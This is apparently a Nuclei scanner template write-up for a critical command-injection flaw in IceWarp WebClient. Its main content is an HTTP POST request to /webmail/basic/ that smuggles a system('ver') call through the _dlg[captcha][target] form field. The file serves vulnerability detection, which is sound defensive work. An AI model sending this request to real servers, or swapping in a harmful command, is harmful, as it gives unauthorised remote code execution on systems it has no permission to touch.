# Nuclei Template: IceWarp WebClient - Remote Code Execution
**Template ID:** icewarp-webclient-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`icewarp-webclient-rce.yaml`)

## Vulnerability Information & PoC

## Description
IceWarp WebClient is susceptible to remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /webmail/basic/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_dlg[captcha][target]=system(\'ver\')\
```

